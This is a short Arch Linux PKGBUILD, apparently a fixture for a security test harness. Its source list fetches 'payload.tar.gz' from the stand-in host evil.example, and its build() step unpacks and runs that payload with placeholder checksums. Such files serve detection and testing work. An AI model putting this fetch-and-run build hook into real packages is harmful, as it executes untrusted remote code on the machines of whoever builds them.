pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
        "https://evil.example/payload.tar.gz")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
            'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

build() {
  tar -xzf "$srcdir/payload.tar.gz" -C "$srcdir"
  cd "$srcdir/payload"
  cargo run
}
